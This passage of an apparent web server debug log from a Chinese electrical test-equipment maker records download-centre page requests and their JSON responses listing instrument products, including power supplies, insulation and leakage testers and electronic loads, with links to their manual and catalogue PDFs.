P9505\\10-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":262,"title":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20260309\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":263,"title":"\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eeaPNL2675\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":264,"title":" \u63a5\u5730\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2678XM\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":268,"title":"\u591a\u901a\u9053\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2818-X\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":270,"title":"\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2511\u6570\u7801\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/405841dc3a1790083cdfb28d392a51b6.pdf","agreement":"","drive":"","resource":""},{"id":271,"title":"\u591a\u8def\u6e29\u5ea6\u5de1\u68c0\u6d4b\u8bd5\u4eeaP2000-X PLUS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/88bebf25cc9f75277abfb9945aa00ebc.pdf","agreement":"","drive":"","resource":""},{"id":272,"title":"\u624b\u6301\u591a\u8def\u6e29\u5ea6\u6d4b\u8bd5\u4eeaP300-S\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/4eeb7970b89981df90d0560b8dbe2ff8.pdf","agreement":"","drive":"","resource":""},{"id":290,"title":"\u4ea4\u6d41\u6052\u6d41\u6e90","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":291,"title":"\u4e09\u76f8\u578bPNL300-S\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf"},{"id":295,"title":"\u5c0f\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":298,"title":"\u533b\u7528\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eea","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":299,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66763U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":300,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 10kw-15kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":303,"title":"\u5b89\u89c4\u7efc\u5408\u6821\u51c6\u70b9\u68c0\u5de5\u88c5","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":304,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea5KV\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":306,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea10KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":307,"title":"\u8010\u538b\u6d4b\u8bd5\u4eea20KV\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":308,"title":"\u7a0b\u63a7\u8010\u538b\u7edd\u7f18PNL7110\\PNL7122\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":309,"title":"\u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":311,"title":"\u5355\u4e09\u76f8 - \u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950-C\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":312,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9515\\20\\30\\45\\60-\\TSD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":314,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9520\\30-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":315,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2682N\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/7c63757a23e5e98e594bf1b4bf50445a.pdf","agreement":"","drive":"","resource":""},{"id":316,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20-\\TD\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":317,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\50-\\G\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":318,"title":"\u4e09\u76f8\u578b\u8c10\u6ce2PNL300-SX\u7cfb\u52170.2\u7ea7","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf"},{"id":319,"title":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2683AL\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/29f9570871ea60e153dce0b05698a13e.pdf","agreement":"","drive":"","resource":""},{"id":320,"title":"\u5bbd\u8303\u56f4\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2513\/15\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/d94e60f7d79a2b3b6d9b106bf787c6db.pdf","agreement":"","drive":"","resource":""},{"id":321,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66764U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":322,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u66765U\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":323,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667620K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":324,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667640K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":325,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6db2\u667660K\u7cfb\u5217","catalog":"","handbook":"","agreement":"","drive":"","resource":""},{"id":326,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 20kw-30kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":327,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 40kw-60kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":328,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 75kw-90kw\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":329,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-U \u9ad8\u538b\u7cfb\u5217","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf","agreement":"","drive":"","resource":""},{"id":330,"title":"\u4ea4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/18ff267d1dc26e503128741d78be61d7.pdf","agreement":"","drive":"","resource":""},{"id":331,"title":"\u4ea4\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/04725819a3c60dff3e1af918dc2ccaf2.pdf","agreement":"","drive":"","resource":""},{"id":332,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/639e5850541f700cdc64053f1d7a18a7.pdf","agreement":"","drive":"","resource":""},{"id":333,"title":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d","catalog":"","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf","agreement":"","drive":"","resource":""},{"id":337,"title":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":338,"title":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"}]
---------------------------------------------------------------
[ 2026-03-18T14:21:12+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/xiazaizhongxin.html?type=2&name=%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C
[ download ] [{"id":242,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20\\30\\45\\60-\\TSS\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":244,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\60-\\GSD\\GSS\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":260,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9505\\10-\\D\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":262,"name":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20260309\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":263,"name":"\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eeaPNL2675\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":264,"name":" \u63a5\u5730\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2678XM\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":268,"name":"\u591a\u901a\u9053\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2818-X\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":270,"name":"\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2511\u6570\u7801\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/405841dc3a1790083cdfb28d392a51b6.pdf"},{"id":271,"name":"\u591a\u8def\u6e29\u5ea6\u5de1\u68c0\u6d4b\u8bd5\u4eeaP2000-X PLUS\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/88bebf25cc9f75277abfb9945aa00ebc.pdf"},{"id":272,"name":"\u624b\u6301\u591a\u8def\u6e29\u5ea6\u6d4b\u8bd5\u4eeaP300-S\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/4eeb7970b89981df90d0560b8dbe2ff8.pdf"},{"id":291,"name":"\u4e09\u76f8\u578bPNL300-S\u7cfb\u52170.2\u7ea7-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/5f7e3f318e22f4a79790e06a66ac2625.pdf"},{"id":295,"name":"\u5c0f\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf"},{"id":300,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 10kw-15kw\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf"},{"id":306,"name":"\u8010\u538b\u6d4b\u8bd5\u4eea10KV\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":307,"name":"\u8010\u538b\u6d4b\u8bd5\u4eea20KV\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":308,"name":"\u7a0b\u63a7\u8010\u538b\u7edd\u7f18PNL7110\\PNL7122\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":309,"name":"\u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":311,"name":"\u5355\u4e09\u76f8 - \u5b89\u5168\u7efc\u5408\u6027\u80fd\u5206\u6790\u4eeaPNL9950-C\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":312,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9515\\20\\30\\45\\60-\\TSD\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":314,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9520\\30-\\D\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":315,"name":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2682N\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/7c63757a23e5e98e594bf1b4bf50445a.pdf"},{"id":316,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20-\\TD\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":317,"name":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\50-\\G\\D\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf"},{"id":318,"name":"\u4e09\u76f8\u578b\u8c10\u6ce2PNL300-SX\u7cfb\u52170.2\u7ea7-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/c3915be2288c668d42fab75c77d557b6.pdf"},{"id":319,"name":"\u7edd\u7f18\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2683AL\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/29f9570871ea60e153dce0b05698a13e.pdf"},{"id":320,"name":"\u5bbd\u8303\u56f4\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2513\/15\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/d94e60f7d79a2b3b6d9b106bf787c6db.pdf"},{"id":326,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 20kw-30kw\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf"},{"id":327,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 40kw-60kw\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf"},{"id":328,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-Y 75kw-90kw\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf"},{"id":329,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u6e90\u6570\u7801PNL-U \u9ad8\u538b\u7cfb\u5217-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/6991e7a5b3190aa67ef71fc5ef74964e.pdf"},{"id":330,"name":"\u4ea4\u6d41\u7535\u5b50\u8d1f\u8f7d-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/18ff267d1dc26e503128741d78be61d7.pdf"},{"id":331,"name":"\u4ea4\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/04725819a3c60dff3e1af918dc2ccaf2.pdf"},{"id":332,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/639e5850541f700cdc64053f1d7a18a7.pdf"},{"id":333,"name":"\u5927\u529f\u7387\u76f4\u6d41\u7535\u5b50\u8d1f\u8f7d-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/3c0024e1494ae6a3a5ee57c6e55308d8.pdf"},{"id":337,"name":"\u5355\u76f8\u578bPNL300-C\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":338,"name":"\u80fd\u6548\u578bPNL300-E\u4ea4\u76f4\u6d41\u7cfb\u52170.2\u7ea7-\u7528\u6237\u624b\u518c","url":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"}]
---------------------------------------------------------------
[ 2026-03-18T14:21:13+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/xiazaizhongxin.html?type=3&name=%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE
[ download ] 3
---------------------------------------------------------------
[ 2026-03-18T14:21:13+08:00 ] 85.92.66.148 GET punalei.cn/ldcms/xiazaizhongxin.html?type=3&name=%E9%80%9A%E8%AE%AF%E5%8D%8F%E8%AE%AE
[ download ] [{"id":242,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9510\\15\\20\\30\\45\\60-\\TSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":244,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9530\\60-\\GSD\\GSS\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":260,"title":"1-300V\/45-400Hz \u4ea4\u6d41\u53d8\u9891\u7535\u6e90 P9505\\10-\\D\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":262,"title":"\u5355\u76f8\u578bPNL300-A\u4ea4\u6d41\u7cfb\u52170.2\u7ea7","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20260309\/ed50ce8156e54152582ff3356228093d.pdf","agreement":"","drive":"","resource":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/ed50ce8156e54152582ff3356228093d.pdf"},{"id":263,"title":"\u6cc4\u6f0f\u7535\u6d41\u6d4b\u8bd5\u4eeaPNL2675\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":264,"title":" \u63a5\u5730\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2678XM\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":268,"title":"\u591a\u901a\u9053\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2818-X\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","agreement":"","drive":"","resource":""},{"id":270,"title":"\u76f4\u6d41\u7535\u963b\u6d4b\u8bd5\u4eeaPNL2511\u6570\u7801\u7cfb\u5217","catalog":"https:\/\/qiniu.punalei.cn\/uploads\/20250630\/9f6157e1177e99e4fe3674e8d06014a8.pdf","handbook":"https:\/\/qiniu.punalei.cn\/uploads\/20250811\/405841dc3a1790083cdfb28d392a51b6.pdf","agreement":"","drive":"","resource":""},{"id":271,"title":"\u591a\u8def\u6e29\u5ea6\u5de1\u68c0\u6d4b\u8bd5\u4eeaP2000-X 